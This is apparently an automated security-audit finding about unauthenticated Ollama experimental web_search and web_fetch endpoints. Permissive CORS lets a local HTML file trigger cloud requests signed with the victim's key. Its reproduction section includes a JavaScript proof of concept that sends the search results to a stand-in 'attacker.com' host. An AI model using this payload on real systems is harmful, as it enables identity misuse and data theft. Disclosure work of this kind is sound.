Phase: 10
Sequence: 003
Slug: cross-origin-web-search-fetch-proxy-abuse
Verdict: VALID
Rationale: POST /api/experimental/web_search and /api/experimental/web_fetch are CORS-accessible from file:// and vscode-webview:// origins and proxy arbitrary attacker-controlled payloads to ollama.com cloud, signed with the victim's private key, enabling attacker-controlled web search and fetch operations billed to the victim.
Severity-Original: MEDIUM
PoC-Status: pending
Origin-Finding: archon/findings-draft/p4-f07-cors-file-origin.md
Origin-Pattern: AP-001

## Summary

Two experimental endpoints at `POST /api/experimental/web_search` and `POST /api/experimental/web_fetch` are registered on the gin router without authentication. Both pass through to `proxyCloudRequestWithPath`, signing the forwarded request with the victim's local ed25519 private key. The CORS policy allows `file://*` and `vscode-webview://*` origins. A cross-origin attacker can trigger arbitrary web search queries and URL fetch operations as the victim, with responses returned cross-origin to the attacker. This is a distinct variant from the cloud inference abuse (p10-002) because it targets a different proxy path (`/api/web_search`, `/api/web_fetch` on ollama.com) and the payload format is distinct.

## Location

- `server/routes.go:1699-1700` -- POST /api/experimental/web_search and web_fetch (no auth)
- `server/routes.go:1950-1971` -- WebSearchExperimentalHandler, WebFetchExperimentalHandler, webExperimentalProxyHandler
- `server/cloud_proxy.go:179-268` -- proxyCloudRequestWithPath: signs and forwards to ollama.com
- `server/cloud_proxy.go:360-373` -- signCloudProxyRequest → auth.Sign → reads ~/.ollama/id_ed25519
- `envconfig/config.go:100-106` -- AllowedOrigins includes file://* and vscode-webview://*

## Attacker Control

- Full control over the request body forwarded to ollama.com's /api/web_search and /api/web_fetch
- Full control over URLs fetched via web_fetch (potential SSRF at the cloud layer)
- Responses are returned to the attacker via CORS (information disclosure)

## Trust Boundary Crossed

Cross-origin web context (malicious local HTML file, VS Code extension) to ollama.com cloud services boundary. Attacker uses victim's cryptographic identity to perform web operations on the victim's behalf.

## Impact

- Attacker triggers web searches and URL fetches under the victim's cloud identity
- Cloud-side usage quota consumed without victim's consent
- Attacker reads responses (web content, search results) via CORS — information disclosure
- If `web_fetch` accepts arbitrary URLs, this may enable server-side request forgery at the ollama.com cloud layer
- Attack is silent: no local side effect visible to the victim

## Evidence

1. `server/routes.go:1699`: `r.POST("/api/experimental/web_search", s.WebSearchExperimentalHandler)` — no auth, CORS-covered
2. `server/routes.go:1700`: `r.POST("/api/experimental/web_fetch", s.WebFetchExperimentalHandler)` — no auth, CORS-covered
3. `server/routes.go:1958-1971`: `webExperimentalProxyHandler` reads body and calls `proxyCloudRequestWithPath` with path `/api/web_search` or `/api/web_fetch`
4. `server/cloud_proxy.go:210`: `cloudProxySignRequest` signs outbound request with victim's private key
5. `server/cloud_proxy.go:226-227`: full cloud response copied back to `c.Writer`, attacker reads it cross-origin

## Reproduction Steps

1. Start Ollama; ensure it is signed in to ollama.com
2. Create a local HTML file:
   ```html
   <script>
   // Trigger a web search under the victim's cloud identity
   fetch('http://localhost:11434/api/experimental/web_search', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({query: 'site:internal.corp.example.com confidential'})
   })
   .then(r => r.json())
   .then(results => {
     // Exfiltrate search results to attacker
     fetch('https://attacker.com/collect?r=' + encodeURIComponent(JSON.stringify(results)));
   });
   </script>
   ```
3. Open the HTML file locally in the browser
4. Observe: request is signed with victim's key and forwarded to ollama.com/api/web_search
5. Attacker receives the search results response cross-origin
